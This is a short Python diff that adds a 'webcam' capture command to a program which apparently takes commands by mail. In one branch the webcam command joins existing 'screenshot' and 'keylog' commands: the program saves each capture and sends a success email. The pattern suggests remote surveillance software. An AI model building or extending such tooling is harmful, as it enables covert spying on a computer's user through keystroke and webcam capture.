@@ -24,6 +24,7 @@ function_map = {
     'help': help,
     'shutdown': shutdown,
     'screenshot': system_control.screenshot,
+    'webcam': system_control.webcam_image,
     # 'list_apps': resource_monitor.list_apps,
     # 'open_app': resource_monitor.open_app,
     # 'close_app': resource_monitor.close_app,
@@ -43,7 +44,7 @@ def request_handle(msg_list):
         for cmd in cmd_list:
             try:
                 cmd = cmd.lower().strip()
-                if cmd == 'screenshot' or cmd == 'keylog':
+                if cmd == 'screenshot' or cmd == 'keylog' or cmd == 'webcam':
                     filename = function_map[cmd](15)
                     print('Saved to', filename)
                     mail_handle_send.send_mail_success_execution(
